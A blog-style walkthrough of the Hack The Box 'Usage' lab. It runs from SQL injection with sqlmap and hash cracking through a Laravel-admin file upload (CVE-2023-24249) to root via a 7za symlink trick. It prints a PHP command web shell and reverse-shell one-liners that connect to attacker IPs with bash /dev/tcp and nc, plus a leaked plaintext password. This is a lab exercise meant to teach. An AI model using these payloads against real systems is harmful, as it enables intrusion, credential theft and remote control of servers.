---
title:  HTB - Usage
date: 2024-04-13 12:17:34 -0400
categories: [hackthebox , Usage]
tags: [hackthebox, SQL, sql injection,php,wfuzz,nmap,burpsuite,sqlmap,john,htb-usage,ctf,CVE-2023-24249,ssh,linux,7zip,linkSync,ln]
image:
  path: /assets/img/post/usage/usage.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hack the Box - Usage.
---

## Box Info

| Name                  | Bizness          | 
| :-------------------- | ---------------: |
| Release Date          | 13 April, 2024   |
| OS                    | Linux            |
| Rated Difficulty      | Easy             |

## Enumeration

```bash
# Nmap 7.94SVN scan initiated Sun Jun  2 20:56:08 2024 as: nmap -sCV -p 22,80 -oN targete
│ d 10.10.11.18
│ Nmap scan report for 10.10.11.18
│ Host is up (0.084s latency).
│ 
│ PORT   STATE SERVICE VERSION
│ 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
│ | ssh-hostkey: 
│ |   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
│ |_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
│ 80/tcp open  http    nginx 1.18.0 (Ubuntu)
│ |_http-server-header: nginx/1.18.0 (Ubuntu)
│ |_http-title: Did not follow redirect to <http://usage.htb/>
│ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
│ 
│ Service detection performed. Please report any incorrect results at <https://nmap.org/subm>
│ it/ .
│ # Nmap done at Sun Jun  2 20:56:18 2024 -- 1 IP address (1 host up) scanned in 10.52 seco
│ nds
```

Based in the OpenSSH version can sense are running likely `Ubuntu yammy`.

Let's start with the scan to the SubDomain because theres a redirect to `http://usage.htb`

```bash
wfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --hc 400,404,403,302,301 -H "Host: FUZZ.usage.htb" -u http://usage.htb -t 100
```

We can use too this tool for scan directories

```bash
ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

![Image](/assets/img/post/usage/Untitled.png)

We found a subdomain called `admin` so we gonna add to /etc/hosts/ for resolution dns

`echo "10.10.11.18 admin.usage.htb" | sudo tee -a /etc/hosts`

## Web

We can see has a login page, can use `whatweb` for see the technology used the web 

![Image](/assets/img/post/usage/untitledweb.png)


## SQL injection

I tried to look for a vulnerability for some technology that the web will use but I didn't find anything so I tried some XSS and I didn't get anything either so I tried SQLInjection intercepting with burpsuite

![Image](/assets/img/post/usage/Untitled2.png)

When i use the command `' ORDER BY 8-- -` returns a `302 found` status, but what happens if i change the 8 to 9...

![Image](/assets/img/post/usage/Untitled3.png)

We got a 500 Internal Error status so i sense the server has a 8 columns.

So That’s a good indication of SQL injection so we gonna use Sqlmap.

In BurpSuite, right-click on the request, and “Copy to file” > request.txt. sqlmap takes that and looks for injections:

```bash
sqlmap -r request.txt --level 5 --risk 3  -p email --threads 10 --dbs --batch
```
![Image](/assets/img/post/usage/Untitled4.png)

![Image](/assets/img/post/usage/Untitled5.png)

```bash
sqlmap -r -request.txt --level 5 --risk 3 -p email --batch -D usage_blog --tables --threads 10
```

![Image](/assets/img/post/usage/Untitled6.png)

```bash
sqlmap -r -request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump --threads 10
```

![Image](/assets/img/post/usage/Untitled7.png)

![Image](/assets/img/post/usage/Untitled8.png)

And it shows us the administrator and the hash

![Image](/assets/img/post/usage/Untitled9.png)

```sql
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
+----------+--------------------------------------------------------------+
```

## Crack Hash

```bash
echo "$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2" > hash.txt
```

![Image](/assets/img/post/usage/Untitled10.png)

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt password.txt
```

![Image](/assets/img/post/usage/Untitled11.png)

We go use the password for login as admin

![Image](/assets/img/post/usage/Untitled12.png)

## CVE-2023-24249

I enumerate the dependecies versions for found some vulnerabilitie and i found a arbitrary file upload(RCE) crafted a PHP file for laravel-admin v1.8.19 `CVE-2023-24249`.

![Image](/assets/img/post/usage/Untitled13.png)

It matches because we have a section to upload an image file

![Image](/assets/img/post/usage/Untitled14.png)

## Shell

So we gonna use a powny-shell create with php for get a shell interactive

> Also we can use too this method for get a reverse shell `echo '<?php system($_REQUEST['cmd']); ?>' > shell.php` 
> and the url encoded the '&' `http://admin.usage.htb/uploads/images/shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/9001 0>%261'`
{: .prompt-tip }

[***p0wny-shell***](https://github.com/flozz/p0wny-shell)

![Image](https://github.com/flozz/p0wny-shell/raw/master/screenshot.png)

`When upload the file get a error so we go to intercept with burpsuite and add the extension .jpg for bypass and execute the file.`

![Image](/assets/img/post/usage/Untitled15.png)

Looks like this:

![Image](/assets/img/post/usage/Untitled16.png)

So once submit the upload file we gonna go to path where storage the file and execute the command:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.45 7272 >/tmp/f
```
And we got the reverse shell in our machine.
We started with the enumeration in Linux but it was very simple, the .ssh is where it normally contains the id_rsa to log in with ssh.

![Image](/assets/img/post/usage/Untitled17.png)

Download the id_rsa for login with ssh

chmod 400 id_rsa (for USER it is READ permission)[^chmod]


```bash
ssh -i id_rsa dash@10.10.11.18
```

![Image](/assets/img/post/usage/Untitled17.png)

### SSH shell 

If make cat to /etc/passwd it show us a user called `xander` it have a /bin/bash so we go to change of user but before we go to get the password for the user xander

![Image](/assets/img/post/usage/Untitled18.png)

Monit is particularly useful for monitoring daemon processes, such as those started at system boot time. For instance sendmail, sshd, apache and mysql.

`cat ~/.monitrc` 

![Image](/assets/img/post/usage/Untitled19.png)


`password: 3nc0d3d_pa$$w0rd`

![Image](/assets/img/post/usage/Untitled20.png)

`ssh xander@10.10.11.18`

![Image](/assets/img/post/usage/Untitled21.png)

## Linux Privilege Escalation

`sudo -l` #Check commands you can execute with sudo

![Image](/assets/img/post/usage/Untitled22.png)

![Image](/assets/img/post/usage/Untitled23.png)

`/usr/bin/7za`: This is the path to the 7za command, indicating the command to be executed.

a: means adding files to the compressed file.

`/var/backups/project.zip`: The path and name of the compressed file. The Zip file to be created is named project.zip and is located in the /* var/backups/ directory.

- tzip: Specifies the type of compressed file to be in ZIP format.

- snl: Disable compression of soft links. This option tells 7za not to include soft links when compressing, but to compress the target files of soft links directly.

- mmt: Use multi-threading for compression operations to speed up compression.

`*: This part indicates the parameters of the command, -- indicates that the following parameters are all file names, and * indicates all files and folders in the current directory.`

![Image](/assets/img/post/usage/Untitled24.png)

Mainly look at -snl, which directly compresses the target file of the soft link, which means that we can establish a soft connection to a high-privilege directory and read the contents of the high-privilege directory file.

```bash
touch '@root.txt'
ln -s -r /root/root.txt root.txt
sudo /usr/bin/usage_management
```

![Image](/assets/img/post/usage/Untitled25.png)

Finally rooted the machine, can u point to another file like /root/.ssh/id_rsa for login with ssh as administrator with the same process.

#### Source
[^chmod]: <https://www.quora.com/What-does-chmod-400-mean>